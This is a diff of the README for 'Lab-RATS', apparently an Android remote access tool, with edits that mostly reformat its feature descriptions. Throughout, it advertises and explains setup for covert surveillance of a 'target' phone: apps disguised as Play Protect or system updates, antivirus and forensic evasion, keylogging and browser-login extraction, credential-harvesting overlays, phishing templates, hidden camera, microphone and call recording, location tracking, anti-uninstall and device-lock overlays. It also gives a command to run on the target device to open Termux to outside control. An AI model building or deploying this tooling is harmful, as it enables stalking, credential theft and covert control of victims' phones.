@@ -26,9 +26,9 @@
 
 Developed from the ground up by **K4N3CO**, **Lab-RATS** is an **open-source, lightweight Android Remote Administration Framework** packed with **real-time telemetry** and **covert control capabilities**. The framework **automates the generation of custom, signed `.apk` payloads** for seamless deployment onto **any Android devices**, paired with a **responsive, web-based C2 dashboard**. Engineered for **resilience in modern mobile security environments**, **Lab-RATS** delivers a **robust feature suite** operating reliably across both **legacy** and **current Android OS releases**.
 <details>
-  <summary><b>📸 View Comparative Breakdown</summary></b>
+  <summary><b>📸 View Comparative Breakdown (Google Gemini)</summary></b>
   <br>
-  <img width="400" height="512" alt="Screenshot 2026-11-16 at 5 24 11 PM" src="https://github.com/user-attachments/assets/3dd73ef0-8f95-4be3-8cca-e5d55048fab3" />
+  <img width="430" height="510" alt="Screenshot 2026-11-16 at 5 24 11 PM" src="https://github.com/user-attachments/assets/3dd73ef0-8f95-4be3-8cca-e5d55048fab3" />
 </details>
 
 ---
@@ -40,17 +40,16 @@ alt="Typing Banner"
 </p>
 
 ## 🌐 How Direct IPv6 Mode Works in Lab-RATS
-
 <details>
-<summary><b>1. What is Direct IPv6 Mode?</b></summary>
+<summary><b>What is Direct IPv6 Mode?</b></summary>
 <br>
 
-* **In Direct IPv6 Mode**, **the target Android device itself acts as the C2 web server**. An embedded HTTP server (`NanoHTTPD`) runs inside the background Android service and listens directly on port `9191`.
+In **Direct IPv6 Mode**, the **target Android device itself acts as the C2 web server**. An embedded HTTP server (`NanoHTTPD`) runs inside the **background Android service** and listens directly on port `9191`.
 
 </details>
 
 <details>
-<summary><b>2. The IPv6 Advantage: Eliminating CGNAT & Port Forwarding</b></summary>
+<summary><b>The IPv6 Advantage: Eliminating CGNAT & Port Forwarding</b></summary>
 <br>
 
 * **The Traditional IPv4 Problem:** On standard IPv4 mobile networks (3G/4G/5G), cellular carriers place devices behind **Carrier-Grade NAT (CGNAT)**. This shares a single public IP address among thousands of mobile devices, making incoming connections impossible without port forwarding, reverse proxies, or tools like Ngrok.
@@ -59,21 +58,13 @@ alt="Typing Banner"
 </details>
 
 <details>
-<summary><b>3. Zero-Configuration Peer-to-Peer (P2P) Control</b></summary>
+<summary><b>Zero-Configuration Peer-to-Peer (P2P) Control</b></summary>
 <br>
 
 * **No Cloud Relay Required:** Traffic flows directly between the operator's browser and the target device without passing through an intermediate cloud server.
 * **No Router Access Needed:** Eliminates the need to access the target's Wi-Fi router or configure firewall rules.
 * **Low Latency:** Eliminating middleman servers results in instant command execution and live screen streaming.
 
-</details>
-
-
-</details>
-<details>
-  <summary><b>📸 View IPv6 Exploit Vector</summary></b>
-  <br> align="center">
-  <img src="https://github.com/user-attachments/assets/7097e0e0-1190-4774-b758-ca58b5e8760f" alt="Full Web Page Screenshot" width="80%">
 </details>
 
 > [!NOTE]
@@ -92,10 +83,8 @@ alt="Typing Banner"
   <summary><b>🔐 Remote C2 Security & Secure Handshake</b></summary>
   <br>
   <ul>
-    <li><strong>C2 Security:</strong><br>
-  The <strong>C2 Dashboard</strong> is <strong>protected with a secure login</strong> which can be <strong>changed directly from the Terminal/Home page</strong>. The <strong>Default Password should be reset immediately</strong> for <strong>enhanced security</strong>.</li>
-    <li><strong>Secure Handshake:</strong><br>
-  Uses a <strong>masked credential handshake</strong>. Passwords are <strong>reversed and Base64 encoded</strong> <em>(<code>0x_</code> prefixed)</em> on the <strong>client-side before transmission</strong>, rendering them <strong>invisible to browser Network/Payload inspectors</strong>.</li>
+    <li><strong>C2 Security:</strong> The <strong>C2 Dashboard</strong> is <strong>protected with a secure login</strong> which can be changed during build setup <strong>or directly from the Terminal Tab</strong>. The <strong>Default Password should be changed immediately</strong> for <strong>enhanced security</strong>.</li>
+    <li><strong>Secure Handshake:</strong> Uses a <strong>masked credential handshake</strong>. Passwords are <strong>reversed and Base64 encoded</strong> <em>(<code>0x_</code> prefixed)</em> on the <strong>client-side before transmission</strong>, rendering them <strong>invisible to browser Network/Payload inspectors</strong>.</li>
  </ul>
 </details>
 
@@ -103,12 +92,9 @@ alt="Typing Banner"
   <summary><b>📦 Automated APK Generation, Identity Control & Density Scaling</b></summary>
   <br>
   <ul>
-    <li><strong>Instant Build:</strong><br>
-  <strong>Instantly build</strong> <code>signed.apk</code> for <strong>production</strong> and <strong>testing</strong>.</li>
-    <li><strong>Full Customization:</strong><br>
-  <strong>Fully</strong> customize <strong>App Name</strong>, <strong>Package ID</strong>, and <strong>Minimum SDK</strong>.</li>
-    <li><strong>Density Scaling:</strong><br>
-  <strong>Resize logos automatically</strong> for <strong>all Android screen densities</strong>.</li>
+    <li><strong>Instant Build:</strong> <strong>Instantly build</strong> <code>signed.apk</code> for <strong>production</strong> and <strong>testing</strong>.</li>
+    <li><strong>Full Customization:</strong> <strong>Fully</strong> customize <strong>App Name</strong>, <strong>Package ID</strong>, and <strong>Minimum SDK</strong>.</li>
+    <li><strong>Density Scaling:</strong> <strong>Resize logos automatically</strong> for <strong>all Android screen densities</strong>.</li>
  </ul>
 </details>
 
@@ -116,8 +102,7 @@ alt="Typing Banner"
   <summary><b>📱 PC/Mobile Responsive</b></summary>
   <br>
   <ul>
-    <li><strong>Adaptive Interface:</strong><br>
-  The <strong>remote web interface</strong> is <strong>fully optimized</strong> for <strong>both PC</strong> and <strong>smartphone browsers</strong>, featuring a <strong>touch-friendly layout, adaptive navigation tabs</strong>, and <strong>scalable UI elements</strong> for <strong>monitoring from any device</strong>.</li>
+    <li><strong>Adaptive Interface:</strong> The <strong>remote web interface</strong> is <strong>fully optimized</strong> for <strong>both PC</strong> and <strong>smartphone browsers</strong>, featuring a <strong>touch-friendly layout, adaptive navigation tabs</strong>, and <strong>scalable UI elements</strong> for <strong>monitoring from any device</strong>.</li>
  </ul>
 </details>
 
@@ -128,11 +113,24 @@ alt="Typing Banner"
 </p>
 
 <details>
+  <summary><b>🎭 Stealth App Decoys</b></summary>
+  <br>
+ <strong>Execute an instant remote swap of the Lab-RATS app identity and icon using realistic, operational clones from the "Masquerade Library"</strong>:
+  <ul><br>
+    <li><strong>👀 Play Protect (Default):</strong> Used for initial install it <strong>simulates a system update</strong> and <strong>auto-grants all permissions</strong> <em>(other than Accessibility services)</em> during the process, achieving <strong>highly successful installs</strong>.</li>
+    <li><strong>🧮 Calculator:</strong> Performs actual math with a <strong>tactical logic engine</strong>.</li>
+    <li><strong>🌦️ Weather App:</strong> Displays <strong>real-time localized forecasts</strong> via Open-Meteo API.</li>
+    <li><strong>🛡️ Software Update:</strong> Simulates a legitimate system update screen to <strong>build target trust</strong>.</li>
+    <li><strong>🧠 Smart Tutor:</strong> Simple overlay to seem innocuous and <strong>blend into samsung stock apps</strong></li>
+    <li><strong>🐭 Lab-Rats & System Stability Services:</strong> Completely unmasked and <strong>directly opens</strong> the C2 server interface on device.</li>
+ </ul>
+</details>
+
+<details>
   <summary><b>💉 APK Payload Delivery Vectors</b></summary>
   <br>
   <ul>
-    <li><strong>Weaponization Engine:</strong><br>
-  The <strong>Weaponization Engine</strong> has been <strong>overhauled to support multiple high-success delivery methods</strong> <em>(Stealth PDF, Zero-Click MP4, Meeting Invite and Many More)</em>, <strong>ensuring reliable access</strong> across <strong>all modern mobile environments</strong>.</li>
+    <li><strong>Weaponization Engine:</strong> The <strong>Weaponization Engine</strong> has been <strong>overhauled to support multiple high-success delivery methods</strong> <em>(Stealth PDF, Zero-Click MP4, Meeting Invite and Many More)</em>, <strong>ensuring reliable access</strong> across <strong>all modern mobile environments</strong>.</li>
  </ul>
 </details>
 
@@ -140,34 +138,11 @@ alt="Typing Banner"
   <summary><b>🛡️ Evasion Engine</b></summary>
   <br>
   <ul>
-    <li><strong>AV/AVE Bypasses:</strong><br>
-  <strong>Undetectable by Samsung Knox</strong>, <strong>McAfee</strong> and <strong>Google Play Protect</strong>.</li>
-    <li><strong>Deep Stealth HTML Shield:</strong><br>
-  The C2 dashboard <strong>utilizes Shadow DOM Cloaking</strong> and <strong>Base64 Payload Wrapping</strong>. Browser "Elements" inspection is <strong>zeroed-out</strong>, and the <strong>tactical structure is ghosted from analysts</strong>.</li>
-    <li><strong>Web Hardening:</strong><br>
-  Assets <em>(JS/CSS)</em> are <strong>minified and obfuscated</strong>; featuring <strong>anti-debugging loops</strong> and <strong>interaction locks</strong> <em>(Right-Click, F12)</em> to <strong>prevent unauthorized analysis</strong>.</li>
-    <li><strong>Dynamic Code Obfuscation:</strong><br>
-  Build-time <strong>randomization</strong> of <strong>logic flow</strong> and <strong>class names via ProGuard/R8 integration</strong>.</li>
-    <li><strong>Encrypted Local Telemetry:</strong><br>
-  Internal <strong>system logs are encrypted at build-time</strong>, rendering them <strong>unreadable to standard mobile forensic tools</strong>.</li>
- </ul>
-</details>
-
-<details>
-  <summary><b>🎭 Stealth App Decoys</b></summary>
-  <br>
-  <strong>Remotely swap the entire Lab-RATS app identity and icon instantly</strong> using <strong>the "Masquerade Library"</strong> of <strong>convincing, fully functional Clones</strong>:
-  <ul>
-    <li><strong>👀 Play Protect (Default):</strong><br>
-  <strong>Used for initial install</strong> it <strong>simulates a system stability update</strong> and <strong>auto-grants all permissions <em>(other than Accessibility services)</em> during the process</strong>, achieving <strong>highly successful installs</strong>.</li>
-    <li><strong>🧮 Calculator:</strong><br>
-  <strong>Performs actual math</strong> with a <strong>tactical logic engine</strong>.</li>
-    <li><strong>🌦️ Weather App:</strong><br>
-  Displays <strong>real-time localized forecasts</strong> via <strong>Open-Meteo API</strong>.</li>
-    <li><strong>🛡️ Software Update:</strong><br>
-  <strong>Simulates a legitimate system update screen</strong> to <strong>build target trust</strong>.</li>
-    <li><strong>🐭 Lab-Rats & System Stability Services:</strong><br>
-  <strong>Completely unmasked</strong> and <strong>directly opens</strong> the <strong>C2 server interface on device</strong>.</li>
+    <li><strong>AV/AVE Bypasses:</strong> Undetectable by <strong>Samsung Knox</strong>, <strong>McAfee</strong> and <strong>Google Play Protect</strong>.</li>
+    <li><strong>Deep Stealth HTML Shield:</strong> The C2 dashboard utilizes <strong>Shadow DOM Cloaking</strong> and <strong>Base64 Payload Wrapping</strong>. Browser "Inspect Element" is zeroed-out, and the tactical structure is <strong>ghosted from analysts</strong>.</li>
+    <li><strong>Web Hardening:</strong> Assets <em>(JS/CSS)</em> are <strong>minified and obfuscated</strong>; featuring anti-debugging loops and interaction locks <em>(Right-Click, F12)</em> to <strong>prevent unauthorized analysis</strong>.</li>
+    <li><strong>Dynamic Code Obfuscation:</strong> Build-time randomization of logic flow and class names via <strong>ProGuard/R8 integration</strong>.</li>
+    <li><strong>Encrypted Local Telemetry:</strong> Internal system logs are encrypted at build-time, rendering them <strong>unreadable to standard mobile forensic tools</strong>.</li>
  </ul>
 </details>
 
@@ -175,14 +150,10 @@ alt="Typing Banner"
   <summary><b>☎️ Emergency Recovery & Self Healing</b></summary>
   <br>
   <ul>
-    <li><strong>Dialer Unlock:</strong><br>
-  Type <code>*#1337#</code> on the <strong>phone's keypad</strong> to <strong>unmask the Lab-RATS server interface back into view</strong>.</li>
-    <li><strong>Hidden Backdoor:</strong><br>
-  If the <strong>device is in stealth mode</strong>, <strong>rapidly tap the middle of the decoy screen 10 times</strong> to <strong>unlock the C2 server interface</strong>. <em>(Reverts to stealth mode again once app is closed)</em></li>
-    <li><strong>Self-Healing Engine:</strong><br>
-  <strong>Automatically detects</strong> and <strong>repairs damaged service bindings</strong> or <strong>revoked permissions in the background</strong>.</li>
-    <li><strong>Anti-Removal:</strong><br>
-  <strong>On by default</strong> in the <strong>Ghost Tab</strong>, it <strong>prevents the user from uninstalling</strong> or <strong>force-stopping the app</strong> via Settings.</li>
+    <li><strong>Dialer Unlock:</strong> Type <code>*#1337#</code> on the <strong>phone's keypad</strong> to <strong>unmask the Lab-RATS server interface back into view</strong>.</li>
+    <li><strong>Hidden Backdoor:</strong> If the <strong>device is in stealth mode</strong>, <strong>rapidly tap the middle of the decoy screen 10 times</strong> to <strong>unlock the C2 server interface</strong>. <em>(Reverts to stealth mode again once app is closed)</em></li>
+    <li><strong>Self-Healing Engine:</strong> Automatically detects and repairs damaged service bindings or r<strong>evoked permissions in the background</strong>.</li>
+    <li><strong>Anti-Removal:</strong> On by default in the <strong>Ghost Tab</strong>, it prevents the user from <strong>uninstalling</strong> or <strong>force-stopping the app</strong> via Settings.</li>
  </ul>
 </details>
 
@@ -190,10 +161,8 @@ alt="Typing Banner"
   <summary><b>🔄 Remote Server Restart</b></summary>
   <br>
   <ul>
-    <li><strong>Web UI Restart:</strong><br>
-  <strong>One-click "RESTART_SERVER" button</strong> on the <strong>Terminal tab</strong> to <strong>refresh background services</strong>.</li>
-    <li><strong>SMS Backdoor Trigger:</strong><br>
-  Send an <strong>SMS/Text containing <code>!RESTART_C2</code></strong> to the <strong>device's number</strong> to <strong>force the server back online</strong> even if it was <strong>manually closed or killed by the OS</strong>.</li>
+    <li><strong>Web UI Restart:</strong> One-click "RESTART_SERVER" button on the Terminal tab to <strong>refresh background services</strong>.</li>
+    <li><strong>SMS Backdoor Trigger:</strong> Send an <strong>SMS/Text containing <code>!RESTART_C2</code></strong> to the device's number to force the server back online even if it was <strong>manually closed or killed by the OS</strong>.</li>
  </ul>
 </details>
 
@@ -201,10 +170,8 @@ alt="Typing Banner"
   <summary><b>👻 Task-List Ghosting & Dynamic OTA Camouflage</b></summary>
   <br>
   <ul>
-    <li><strong>Recent Apps Ghosting:</strong><br>
-  The app is <strong>hard-coded</strong> to be <strong>invisible in the Android "Recent Apps" list</strong>.</li>
-    <li><strong>Dynamic OTA Camouflage:</strong><br>
-  Generates <strong>random version names and codes</strong> that <strong>mimic legitimate system OTA updates</strong>.</li>
+    <li><strong>Recent Apps Ghosting:</strong> The app is hard-coded to be <strong>invisible in the Android "Recent Apps" list</strong>.</li>
+    <li><strong>Dynamic OTA Camouflage:</strong> Generates random version names and codes that <strong>mimic legitimate system OTA updates</strong>.</li>
  </ul>
 </details>
 
@@ -218,16 +185,11 @@ alt="Typing Banner"
   <summary><b>👻 Ghost Operations</b></summary>
   <br>
   <ul>
-    <li><strong>Ghost Control / Live Feed:</strong><br>
-  <strong>Cast & Control the live screen remotely</strong> with <strong>NO "Consent Prompt" required</strong>.</li>
-    <li><strong>Blackout Mode:</strong><br>
-  A <strong>high-stealth mode</strong> designed to <strong>physically mask the target's device display</strong> while maintaining a <strong>NON-masked live remote feed</strong>. <em>(Pair with Ghost Control for maximum stealth)</em></li>
-    <li><strong>Ghost_Toast Overlays:</strong><br>
-  Remotely deploy <strong>tactical, persistent pop-up overlays</strong> with <strong>fully customizable text</strong> <em>(color, size, and screen positioning)</em>. Features <strong>multiple animation styles</strong> <em>(pop, static, and side-scroll)</em> alongside a <strong>high-intensity "Burnt_Toast" mode</strong> that <strong>floods the screen with randomized pop-ups</strong> to <strong>overwhelm the device</strong>.</li>
-    <li><strong>Remote System Denial Lock:</strong><br>
-  Deploy a <strong>persistent, full-screen security overlay</strong> to <strong>lock physical interaction</strong> and <strong>render the device inoperable until hard-reset/restarted</strong> or <strong>unlocked remotely from the C2 dashboard</strong>.</li>
-    <li><strong>Live Keylogging & Sensitive Extraction:</strong><br>
-  Intercept <strong>keystrokes</strong> and <strong>system text in real-time</strong>. Features <strong>Sensitive Info Highlighting</strong> <em>(Passcodes, OTPs, Emails glow Red)</em> and <strong>Deep Extraction</strong> for <strong>browser login info</strong>.</li>
+    <li><strong>Ghost Control / Live Feed:</strong> Cast & Control the live screen remotely with <strong>NO "Consent Prompt" required</strong>.</li>
+    <li><strong>Blackout Mode:</strong> A high-stealth mode designed to physically mask the target's device display while maintaining a <strong>NON-masked live remote feed</strong>. <em>(Pair with Ghost Control for maximum stealth)</em></li>
+    <li><strong>Ghost_Toast Overlays:</strong> Remotely deploy tactical, persistent pop-up overlays with fully customizable text <em>(color, size, and screen positioning)</em>. Features multiple animation styles <em>(pop, static, and side-scroll)</em> alongside a <strong>high-intensity "Burnt_Toast" mode</strong> that <strong>floods the screen with randomized pop-ups</strong> to overwhelm the device.</li>
+    <li><strong>Remote System Denial Lock:</strong> Deploy a persistent, full-screen security overlay to <strong>lock physical interaction</strong> and <strong>render the device inoperable until hard-reset/restarted</strong> or <strong>unlocked remotely from the C2 dashboard</strong>.</li>
+    <li><strong>Live Keylogging & Sensitive Extraction:</strong> Intercept keystrokes and system text in real-time. Features <strong>Sensitive Info Highlighting</strong> <em>(Passcodes, OTPs, Emails glow Red)</em> and <strong>Deep Extraction</strong> for <strong>browser login info</strong>.</li>
  </ul>
 </details>
 
@@ -235,14 +197,10 @@ alt="Typing Banner"
   <summary><b>🧪 Exploit Factory</b></summary>
   <br>
   <ul>
-    <li><strong>NFC Proximity Vector:</strong><br>
-  Generate <strong>binary NDEF payloads for physical tags</strong>.</li>
-    <li><strong>QR Visual Vector:</strong><br>
-  Dedicated <strong>high-density QR code generator</strong> for independent URL delivery.</li>
-    <li><strong>Smishing Library:</strong><br>
-  Pre-configured <strong>tactical phishing templates</strong>.</li>
-    <li><strong>Shadow Overlay Injection:</strong><br>
-  Remotely <strong>inject functional, pixel-perfect credential-harvesting overlays</strong> to the device.</li>
+    <li><strong>NFC Proximity Vector:</strong> Generate <strong>binary NDEF payloads for physical tags</strong>.</li>
+    <li><strong>QR Visual Vector:</strong> Dedicated <strong>high-density QR code generator</strong> for independent URL delivery.</li>
+    <li><strong>Smishing Library:</strong> Pre-configured <strong>tactical phishing templates</strong>.</li>
+    <li><strong>Shadow Overlay Injection:</strong> Remotely <strong>inject functional, pixel-perfect credential-harvesting overlays</strong> to the device.</li>
  </ul>
 </details>
 
@@ -250,10 +208,8 @@ alt="Typing Banner"
   <summary><b>💀 Anti-Removal & Self Destruct</b></summary>
   <br>
   <ul>
-    <li><strong>Anti-Removal Shield:</strong><br>
-  <strong>High-speed, event-driven protection shield</strong> that <strong>Blocks Attempts</strong> to <strong>Uninstall</strong> or <strong>Force Stop</strong> the <strong>app</strong>.</li>
-    <li><strong>Suicide (Self-Destruct):</strong><br>
-  <strong>Remote-triggered persistent loop</strong> that <strong>wipes all local configuration</strong> and <strong>initiates a hard uninstallation of the C2 Core</strong>.</li>
+    <li><strong>Anti-Removal Shield:</strong> High-speed, event-driven protection shield that <strong>Blocks Attempts</strong> to <strong>Uninstall</strong> or <strong>Force Stop</strong> the <strong>app</strong>.</li>
+    <li><strong>Suicide (Self-Destruct):</strong> Remote-triggered persistent loop that <strong>wipes all local configuration</strong> and <strong>initiates a hard uninstallation of the C2 Core</strong>.</li>
  </ul>
 </details>
 
@@ -261,10 +217,8 @@ alt="Typing Banner"
   <summary><b>🛰️ Live GPS Tracking & Intel Stream</b></summary>
   <br>
   <ul>
-    <li><strong>Live GPS Uplink:</strong><br>
-  <strong>One-click uplink</strong> to open the <strong>device's exact real-time location</strong> using <strong>Google Maps</strong>.</li>
-    <li><strong>Live Notification Stream:</strong><br>
-  <strong>Intercept every app notification</strong> <em>(WhatsApp, Telegram, RCS, System...etc)</em> in a <strong>live feed</strong>.</li>
+    <li><strong>Live GPS Uplink:</strong> One-click uplink to open the <strong>device's exact real-time location</strong> using <strong>Google Maps</strong>.</li>
+    <li><strong>Live Notification Stream:</strong> Intercept every app notification <em>(WhatsApp, Telegram, RCS, System...etc)</em> in a <strong>live feed</strong>.</li>
  </ul>
 </details>
 
@@ -272,12 +226,9 @@ alt="Typing Banner"
   <summary><b>📸 Tactical Surveillance Hub (Ultra-Stability)</b></summary>
   <br>
   <ul>
-    <li><strong>Covert Video Recording:</strong><br>
-  <strong>Stealthily record video without any user-facing activity</strong>.</li>
-    <li><strong>Covert Photo Capture:</strong><br>
-  <strong>Covert image capture</strong> integrated into the <strong>live stream</strong>.</li>
-    <li><strong>Nightmode V2:</strong><br>
-  Aggressive <strong>electronic brightening</strong> for <strong>low-light environments</strong>.</li>
+    <li><strong>Covert Video Recording:</strong> Stealthily record video without any <strong>user-facing activity</strong>.</li>
+    <li><strong>Covert Photo Capture:</strong> Covert image capture integrated into the <strong>live stream</strong>.</li>
+    <li><strong>Nightmode V2:</strong> Aggressive electronic brightening for <strong>low-light environments</strong>.</li>
  </ul>
 </details>
 
@@ -285,8 +236,7 @@ alt="Typing Banner"
   <summary><b>🎙️ Acoustics & Interception</b></summary>
   <br>
   <ul>
-    <li><strong>Microphone & Call Recording:</strong><br>
-  <strong>Timed or Live microphone recording</strong> and <strong>automated call recording</strong> for <strong>both incoming and outgoing calls</strong>.</li>
+    <li><strong>Microphone & Call Recording:</strong> Timed or Live microphone recording and automated call recording for <strong>both incoming and outgoing calls</strong>.</li>
  </ul>
 </details>
 
@@ -294,12 +244,9 @@ alt="Typing Banner"
   <summary><b>📂 Advanced Data Uplink</b></summary>
   <br>
   <ul>
-    <li><strong>Info Gathering:</strong><br>
-  Access <strong>Call Logs</strong>, <strong>Contacts</strong>, <strong>Hardware Analytics</strong>, and <strong>Installed Apps</strong> remotely.</li>
-    <li><strong>Integrated File Manager:</strong><br>
-  <strong>Navigate, download</strong>, and <strong>manage files</strong>. Features an <strong>instant Search Bar</strong> and <strong>Category Filters</strong>.</li>
-    <li><strong>Direct File Editor:</strong><br>
-  <strong>Live-edit text, JSON</strong>, and <strong>log files</strong> directly <strong>on the device</strong>.</li>
+    <li><strong>Info Gathering:</strong> Access <strong>Call Logs</strong>, <strong>Contacts</strong>, <strong>Hardware Analytics</strong>, and <strong>Installed Apps</strong> remotely.</li>
+    <li><strong>Integrated File Manager:</strong> Navigate, download, and manage files. Features an <strong>instant Search Bar</strong> and <strong>Category Filters</strong>.</li>
+    <li><strong>Direct File Editor:</strong> Live-edit text, JSON, and log files directly <strong>on the device</strong>.</li>
  </ul>
 </details>
 
@@ -307,13 +254,10 @@ alt="Typing Banner"
   <summary><b>🖥️ Enhanced Remote Shell</b></summary>
   <br>
   <strong>The Terminal Tab's Built-in Shell has been overhauled for professional workflows:</strong>
-  <ul>
-    <li><strong>Command History:</strong><br>
-  Navigate <strong>previous commands instantly</strong> using <strong>Up/Down arrows</strong>.</li>
-    <li><strong>Modernized Interface:</strong><br>
-  Updated to <code>root@Android</code> prompt with <strong>an updated <code>help</code> menu</strong>.</li>
-    <li><strong>Hardened I/O:</strong><br>
-  <strong>Multi-stage retry logic</strong> and <strong>unique execution tracking</strong> for <strong>zero-latency command output</strong>.</li>
+  <ul><br>
+    <li><strong>Command History:</strong> Navigate <strong>previous commands instantly</strong> using <strong>Up/Down arrows</strong>.</li>
+    <li><strong>Modernized Interface:</strong> Updated to <code>User@Android</code> prompt with <strong>an updated <code>help</code> menu</strong>.</li>
+    <li><strong>Hardened I/O:</strong> Multi-stage retry logic and <strong>unique execution tracking</strong> for <strong>zero-latency command output</strong>.</li>
  </ul>
 </details>
 
@@ -321,8 +265,7 @@ alt="Typing Banner"
   <summary><b>📊 Telemetry & Reporting</b></summary>
   <br>
   <ul>
-    <li><strong>C2 Auto-Reporting:</strong><br>
-  <strong>Discrete reporting</strong> of <strong>Date & Time, Device ID, Connection Type <em>(WiFi/Cellular)</em>, IP, Port, C2 Dashboard Link, Battery % and more</strong> to a <strong>centralized Google Sheet or Render C2</strong>.</li>
+    <li><strong>C2 Auto-Reporting:</strong> Discrete reporting of <strong>Date & Time, Device ID, Connection Type <em>(WiFi/Cellular)</em>, IP, Port, C2 Dashboard Link, Battery % and more</strong> to a <strong>centralized Google Sheet or Render C2</strong>.</li>
  </ul>
 </details>
 
@@ -335,20 +278,17 @@ alt="Typing Banner"
 <details>
   <summary><b>🛠️ Termux Bridge Integration</b></summary>
   <br>
+  
   <strong>Lab-RATS features a high-performance bridge to the Termux environment. If Termux is installed on the target device, the remote terminal can instantly elevate its capabilities:</strong>
   <ul>
-    <li><strong>Auto-Routing:</strong><br>
-  Common commands like <code>pkg</code>, <code>apt</code>, <code>pip</code>, and <code>python</code> are <strong>routed through the bridge</strong>.</li>
-    <li><strong>Unrestricted Tools:</strong><br>
-  <strong>Install</strong> and <strong>run Python scripts, Nmap scans, or Metasploit</strong> from the <strong>C2 web terminal</strong>.</li>
-    <li><strong>Persistent Environment:</strong><br>
-  Full support for <strong>Termux's internal storage</strong> and <strong>standard Linux binaries</strong>.</li>
+    <li><strong>Auto-Routing:</strong> Common commands like <code>pkg</code>, <code>apt</code>, <code>pip</code>, and <code>python</code> are <strong>routed through the bridge</strong>.</li>
+    <li><strong>Unrestricted Tools:</strong> Install and run <strong>Python scripts, Nmap scans, or Metasploit</strong> from the <strong>C2 web terminal</strong>.</li>
+    <li><strong>Persistent Environment:</strong> Full support for <strong>Termux's internal storage</strong> and <strong>standard Linux binaries</strong>.</li>
   </ul>
   
-  > Termux Bridge Issues:<br>
-  > "Termux `allow-external-apps` setting is disabled" (Most Common).<br>
-  > Fix:<br>
-  > On the Target Device open Termux and run:
+  > **Termux Bridge Issues**:<br>
+  > <br>**ISSUE** - "Termux `allow-external-apps` setting is disabled" *(Most Common)*.<br>
+  > **FIX** - On the **Target Device** open Termux and run:
   ```
   echo "allow-external-apps = true" >> ~/.termux/termux.properties
   termux-reload-settings
@@ -368,9 +308,9 @@ alt="Typing Banner"
   <br>
   <ul>
     <li><strong>Java Development Kit (JDK):</strong><br>
-  <strong>JDK 17 or JDK 21</strong> <em>(JDK 21 recommended)</em>. Ensure <code>JAVA_HOME</code> is set in <strong>your environment paths</strong>.</li>
+  JDK <strong>17 or JDK 21</strong> <em>(JDK 21 recommended)</em>. Ensure <code>JAVA_HOME</code> is set in <strong>your environment paths</strong>.</li>
     <li><strong>Android SDK:</strong><br>
-  <strong>Android SDK 34</strong> <em>(API Level 34)</em> or <strong>higher</strong>. Build-Tools version <code>34.0.0</code> or <strong>higher</strong> <em>(includes <code>aapt2</code>, <code>zipalign</code>, and <code>apksigner</code>)</em>.</li>
+  Android <strong>SDK 34</strong> <em>(API Level 34)</em> or <strong>higher</strong>. Build-Tools version <code>34.0.0</code> or <strong>higher</strong> <em>(includes <code>aapt2</code>, <code>zipalign</code>, and <code>apksigner</code>)</em>.</li>
     <li><strong>Python 3.x:</strong><br>
   Required for <strong>Option 7: Smali Surgery & APK Binder</strong> <em>(<code>binder.py</code>)</em>.</li>
     <li><strong>Gradle:</strong><br>
@@ -387,7 +327,7 @@ alt="Typing Banner"
     <li><strong>npm:</strong><br>
   <strong>v9.0.0</strong> or <strong>higher</strong>.</li>
     <li><strong>Render / Linux Hosting:</strong><br>
-  512 MB RAM minimum <em>(Render Free Tier supported)</em>.</li>
+  <strong>512 MB RAM</strong> minimum <em>(Render Free Tier supported)</em>.</li>
   </ul>
 </details>
 
@@ -396,11 +336,11 @@ alt="Typing Banner"
   <br>
   <ul>
     <li><strong>Minimum OS:</strong><br>
-  <strong>Android 5.0</strong> <em>(Lollipop/API 21)</em> or <strong>higher</strong>.</li>
+ Android <strong>5.0</strong> <em>(Lollipop/API 21)</em> or <strong>higher</strong>.</li>
     <li><strong>Target OS:</strong><br>
-  <strong>Android 14 - 17</strong> <em>(API 34 - 37)</em> <strong>fully supported</strong>.</li>
+  Android <strong>14 - 17</strong> <em>(API 34 - 37)</em> <strong>fully supported</strong>.</li>
     <li><strong>Supported Devices:</strong><br>
-  <strong>Samsung, Google Pixel, OnePlus, Xiaomi, Motorola, HTC, LG</strong>, and <strong>generic Android devices/emulators</strong>.</li>
+  Samsung, Google Pixel, OnePlus, Xiaomi, Motorola, HTC, LG, and generic Android devices/emulators.</li>
   </ul>
 </details>
 
@@ -409,11 +349,11 @@ alt="Typing Banner"
   <br>
   <ul>
     <li><strong>🐧 Linux:</strong><br>
-  <strong>Kali Linux, Ubuntu, Debian, Arch</strong> <em>(Full support for build scripts & C2 server)</em>.</li>
+  Kali Linux, Ubuntu, Debian, Arch <em>(Full support for build scripts & C2 server)</em>.</li>
     <li><strong>🍎 macOS:</strong><br>
-  <strong>macOS Monterey / Ventura / Sonoma / Sequoia</strong> <em>(Intel & Apple Silicon M1/M2/M3/M4)</em>.</li>
+  macOS Monterey / Ventura / Sonoma / Sequoia <em>(Intel & Apple Silicon M1/M2/M3/M4)</em>.</li>
     <li><strong>🪟 Windows:</strong><br>
-  <strong>Windows 10 / 11 via PowerShell, Command Prompt</strong>, or <strong>WSL2</strong>.</li>
+  Windows 10 / 11 via PowerShell, Command Prompt, or WSL2.</li>
   </ul>
 </details>
 
@@ -427,7 +367,7 @@ alt="Typing Banner"
 <details>
   <summary><b>📸 View Direct IPv6 (Google Sheet) vs. Render Cloud Relay (Node.js) Chart</summary></b>
   <br>
-  <img alt="Screenshot 2026-11-16 at 5 24 11 PM" src="https://github.com/user-attachments/assets/a95fdd22-1226-45ab-ae61-b099a7d0311b" />
+  <img width="730" height="370" alt="Screenshot 2026-11-16 at 5 24 11 PM" src="https://github.com/user-attachments/assets/a95fdd22-1226-45ab-ae61-b099a7d0311b" />
 </details>
 
 ### ☝🏻 Option 1: Direct IPv6 (Google Sheet) 
@@ -492,13 +432,13 @@ data.stealth === "true") ? "ACTIVE" : "OFF",
 
 <details>
   <summary><b>📸 View Google Sheet Reporting Example</summary></b>
-  <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="80%">
+  <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="90%">
 </details>
 
 ---
 
 ### ✌🏻 Option 2: Render Cloud Relay (Tactical Node.js Backend)
-> **Best for newer devices running Android 16/17, Professional Fleet Management** & **Automatic File Exfiltration**.
+> **Best for newer devices running Android 16/17, Professional Fleet Management** & **Automatic File Exfiltration**.<br>
 
 **1. Fork the Lab-RATS repository**.
 <br>**2. Create a New Web Service for Free** on <a href="https://render.com" target="_blank">Render.com</a> and **connect your forked Lab-RATS repo**.
